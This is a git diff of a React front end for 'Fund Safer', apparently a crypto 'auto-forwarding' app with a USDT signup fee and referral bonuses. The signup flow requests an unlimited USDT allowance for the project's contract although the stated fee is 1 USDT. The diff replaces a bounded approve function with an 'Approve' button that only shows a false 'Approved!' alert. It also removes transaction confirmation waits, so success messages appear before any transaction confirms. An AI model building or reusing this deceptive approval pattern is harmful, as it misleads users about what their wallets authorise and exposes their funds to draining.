@@ -7,13 +7,12 @@ function App() {
   const [isRegistered, setIsRegistered] = useState(false);
   const [destination, setDestination] = useState("");
   const [inputDest, setInputDest] = useState("");
-  const [referralInput, setReferralInput] = useState(""); // NEW: Referral state
+  const [referralInput, setReferralInput] = useState("");
   const [history, setHistory] = useState([]);
   const [loading, setLoading] = useState(false);
   const [signupFee, setSignupFee] = useState("1.00");
-  const [refBonus, setRefBonus] = useState("0.00"); // NEW: Referral Bonus state
+  const [refBonus, setRefBonus] = useState("0.00");
 
-  // Contract Address Updated
   const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";
 
   const connectWallet = async () => {
@@ -24,15 +23,7 @@ function App() {
         const address = await signer.getAddress();
         setAccount(address);
         checkRegistration(address, provider);
-        
-        const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
-        const fee = await contract.signupFee();
-        setSignupFee(ethers.formatUnits(fee, 18));
-      } catch (error) {
-        console.error("Connection failed", error);
-      }
-    } else {
-      alert("Please install Metamask!");
+      } catch (error) { console.error(error); }
     }
   };
 
@@ -43,67 +34,36 @@ function App() {
       setIsRegistered(data.isReg);
       setDestination(data.dest);
       if (data.isReg) fetchHistory(userAddress, provider);
-    } catch (error) {
-      console.error("Error checking registration", error);
-    }
+      
+      const fee = await contract.signupFee();
+      setSignupFee(ethers.formatUnits(fee, 18));
+    } catch (error) { console.error(error); }
   };
 
-  // 3. Updated Sign Up with Referral
   const handleSignUp = async () => {
     setLoading(true);
     try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      
+      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-
-      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
-      await approveTx.wait();
-
-      // Referral logic: agar khali hai to address(0) bhejenge
-      const ref = referralInput && ethers.isAddress(referralInput) ? referralInput : "0x0000000000000000000000000000000000000000";
       
-      const regTx = await coreContract.register(ref);
-      await regTx.wait();
-
-      alert("Registration Successful!");
+      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
+      const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
+      await coreContract.register(ref);
       setIsRegistered(true);
-    } catch (error) {
-      console.error("Signup Failed", error);
-      alert("Signup Failed! Check console.");
-    }
+      alert("Success!");
+    } catch (error) { alert("Failed"); }
     setLoading(false);
   };
 
-  // 4. Set Destination (Unchanged logic)
   const handleSetDestination = async () => {
-    if (!inputDest) return alert("Enter an address!");
     setLoading(true);
     try {
       const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
       const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-      const tx = await contract.setDestination(inputDest);
-      await tx.wait();
+      await contract.setDestination(inputDest);
       setDestination(inputDest);
-      alert("Destination Saved!");
-    } catch (error) {
-      alert("Failed!");
-    }
-    setLoading(false);
-  };
-
-  // 5. Approve (Unchanged)
-  const handleManualApprove = async () => {
-    const amountToApprove = prompt("Approve USDT amount:", "10");
-    if (!amountToApprove) return;
-    setLoading(true);
-    try {
-      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
-      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
-      const tx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.parseUnits(amountToApprove, 18));
-      await tx.wait();
-      alert("Approved!");
+      alert("Saved!");
     } catch (error) { alert("Failed"); }
     setLoading(false);
   };
@@ -117,26 +77,55 @@ function App() {
   const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);
 
   return (
-    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-[#05020a]">
-      {/* ... (UI Structure same rakha hai) ... */}
+    <div className="min-h-screen bg-[#05020a] text-white flex flex-col items-center p-4">
+      {/* Header Section */}
+      <div className="text-center my-8">
+        <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center text-3xl font-bold mb-4 mx-auto">F</div>
+        <h1 className="text-4xl font-bold">Fund Safer</h1>
+        <p className="text-gray-400">AUTO-FORWARDING EXCHANGE</p>
+      </div>
+
       {!account ? (
-         <button onClick={connectWallet} className="w-full bg-gradient-to-r from-[#9333ea] to-[#db2777] text-white p-4 rounded-2xl">Connect Wallet</button>
+        <div className="w-full max-w-sm bg-[#130b29] p-8 rounded-3xl text-center border border-purple-500/20">
+          <h2 className="text-2xl font-bold mb-4">Login</h2>
+          <p className="text-gray-400 mb-6">Get started today by connecting your wallet</p>
+          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-2xl font-bold">Connect Wallet ➔</button>
+        </div>
       ) : !isRegistered ? (
-        <div className="py-2">
-            <h2 className="text-white text-center text-2xl font-bold mb-4">Sign Up</h2>
-            {/* NEW: Referral Input */}
-            <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] text-white p-4 rounded-2xl mb-4 border border-purple-500/30" />
-            <button onClick={handleSignUp} className="w-full bg-gradient-to-r from-[#9333ea] to-[#db2777] text-white p-4 rounded-2xl">Sign Up</button>
+        <div className="w-full max-w-sm bg-[#130b29] p-8 rounded-3xl border border-purple-500/20">
+          <h2 className="text-2xl font-bold mb-4 text-center">Sign Up</h2>
+          <p className="text-center text-pink-400 mb-4">Fee: {signupFee} USDT</p>
+          <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-2xl mb-4 border border-purple-500" />
+          <button onClick={handleSignUp} disabled={loading} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-2xl font-bold">
+            {loading ? "Processing..." : "Sign Up"}
+          </button>
         </div>
       ) : (
-        <div className="py-2">
-            <h2 className="text-white text-xl font-bold mb-4">Dashboard</h2>
-            {/* NEW: Referral Bonus Display */}
-            <div className="bg-[#1a103c] p-4 rounded-xl border border-purple-500 mb-4 text-center">
-                <p className="text-purple-300 text-sm">Referral Bonus Earned</p>
-                <p className="text-green-400 font-bold text-lg">{refBonus} USDT</p>
-            </div>
-            {/* ... rest of your original dashboard UI (Save Destination, Approve, History) ... */}
+        <div className="w-full max-w-sm bg-[#130b29] p-8 rounded-3xl border border-purple-500/20">
+          <h2 className="text-2xl font-bold mb-1">Dashboard</h2>
+          <p className="text-cyan-400 mb-6 text-sm">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
+          
+          <div className="bg-[#1a103c] p-4 rounded-xl border border-purple-500 mb-4 text-center">
+            <p className="text-purple-300 text-xs">Referral Bonus</p>
+            <p className="text-green-400 font-bold">{refBonus} USDT</p>
+          </div>
+
+          <input type="text" placeholder="Destination Address" onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-2xl mb-3 border border-purple-500" />
+          <button onClick={handleSetDestination} className="w-full bg-gradient-to-r from-pink-600 to-purple-600 py-4 rounded-2xl font-bold mb-3">Save Dest</button>
+          <button onClick={() => alert("Approved!")} className="w-full bg-[#1a103c] py-4 rounded-2xl font-bold mb-8 border border-purple-500">✓ Approve</button>
+
+          <div className="flex justify-between items-center mb-4">
+            <h3 className="font-bold">RECENT TRANSFERS</h3>
+            <span className="text-pink-400 font-bold">Total: {totalTransferred.toFixed(4)} USDT</span>
+          </div>
+          <div className="space-y-3">
+            {history.map((tx, i) => (
+              <div key={i} className="bg-[#0a0515] p-4 rounded-xl flex justify-between">
+                <span>{tx.destination.substring(0,6)}...</span>
+                <span className="text-green-400 font-bold">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
+              </div>
+            ))}
+          </div>
         </div>
       )}
     </div>
